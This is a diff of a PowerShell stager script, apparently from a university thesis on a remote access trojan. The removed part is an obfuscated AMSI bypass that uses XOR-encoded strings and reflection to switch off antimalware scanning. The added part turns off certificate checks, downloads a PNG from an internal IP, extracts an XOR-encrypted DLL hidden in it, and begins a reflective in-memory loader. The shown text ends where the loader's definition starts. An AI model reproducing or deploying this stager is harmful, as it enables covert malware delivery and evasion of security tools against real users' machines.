@@ -1,35 +1,25 @@
 # Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
-# ── Bypass AMSI custom ─────────────────────────────────────────────────
-# XOR decode del type name + enumera field bool senza cercarlo per nome
-$_k=0x42
-$_e=[byte[]](0x11,0x3B,0x31,0x36,0x27,0x2F,0x6C,0x0F,0x23,0x2C,0x23,0x25,0x27,
-             0x2F,0x27,0x2C,0x36,0x6C,0x03,0x37,0x36,0x2D,0x2F,0x23,0x36,0x2B,
-             0x2D,0x2C,0x6C,0x03,0x2F,0x31,0x2B,0x17,0x36,0x2B,0x2E,0x31)
-$_n=[Text.Encoding]::ASCII.GetString(($_e|%{$_ -bxor $_k}))
-try {
-    $_t=$null
-    [AppDomain]::CurrentDomain.GetAssemblies()|%{
-        try{$x=$_.GetType($_n);if($x){$_t=$x}}catch{}
-    }
-    if($_t){
-        $_bf=[Reflection.BindingFlags]::NonPublic -bor [Reflection.BindingFlags]::Static
-        $_t.GetFields($_bf)|?{$_.FieldType -eq [bool]}|%{
-            try{$_.SetValue($null,$true)}catch{}
-        }
-    }
-}catch{}
+# stager.ps1 — scarica logo_unisa.png (stego), estrae e carica rat.dll in memoria
 
-# ── Download + XOR decrypt payload ────────────────────────────────────
+# ── TLS + WebClient ────────────────────────────────────────────────────
 [Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
 [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
 $wc=New-Object Net.WebClient
-$enc=$wc.DownloadData('https://192.168.42.124/update_dll')
+
+# ── Download immagine stego ────────────────────────────────────────────
+$img=$wc.DownloadData('https://192.168.41.124/logo_unisa.png')
+
+# ── Estrazione DLL cifrata (ultimi 4 byte = offset little-endian) ──────
+$off=[BitConverter]::ToInt32($img,$img.Length-4)
+$enc=$img[$off..($img.Length-5)]
+
+# ── XOR decrypt ────────────────────────────────────────────────────────
 $key=[byte[]](0xD6,0x83,0xF9,0xCE,0x3E,0x3D,0x09,0x12,0x15,0xB4,0x22,0xCF,
               0xEF,0x50,0x9F,0x00,0x27,0x98,0x15,0xC0,0xEE,0x74,0x51,0x68,
               0x7C,0x61,0x55,0x99,0xE7,0x43,0xEE,0x28)
 for($i=0;$i -lt $enc.Length;$i++){$enc[$i]=$enc[$i] -bxor $key[$i % $key.Length]}
 
-# ── Reflective loader — niente VirtualAlloc in DllImport ──────────────
+# ── Reflective loader ──────────────────────────────────────────────────
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
